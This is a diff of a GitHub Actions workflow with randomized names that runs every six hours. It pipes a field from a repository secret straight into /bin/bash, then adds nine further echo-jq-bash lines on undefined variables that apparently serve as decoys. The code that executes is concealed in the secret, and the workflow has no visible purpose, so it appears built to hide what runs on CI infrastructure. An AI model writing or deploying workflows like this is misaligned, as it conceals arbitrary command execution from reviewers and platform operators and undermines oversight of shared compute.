@@ -1,21 +1,26 @@
 name: zhouzhenjie2013
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 2/6 * * *'
-jobs:  # 11099
+    - cron: '45 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: zhouzhenjie2013
         env:
-          znly29009: ${{ secrets.znly29009 }}
+          knst2844: ${{ secrets.knst2844 }}
         run: |
-          echo $znly29009 | jq -r .aovq50 | /bin/bash
-          echo $oejw92 | jq -r .xlvx7 | /bin/bash
-          echo $gg176 | jq -r .cerla5373 | /bin/bash
-          echo $m44950 | jq -r .yph430 | /bin/bash
-          echo $rvawt1278 | jq -r .qt79 | /bin/bash
+          echo $knst2844 | jq -r .ab23 | /bin/bash
+          echo $is50 | jq -r .cbpdf68729 | /bin/bash
+          echo $haub599 | jq -r .r8 | /bin/bash
+          echo $im3 | jq -r .jr4 | /bin/bash
+          echo $ano797 | jq -r .vzzx667 | /bin/bash
+          echo $nuyuf665 | jq -r .n5 | /bin/bash
+          echo $rm37053 | jq -r .km38 | /bin/bash
+          echo $rhb49 | jq -r .c891 | /bin/bash
+          echo $fmd70 | jq -r .rldgw097 | /bin/bash
+          echo $k287 | jq -r .y685 | /bin/bash
 
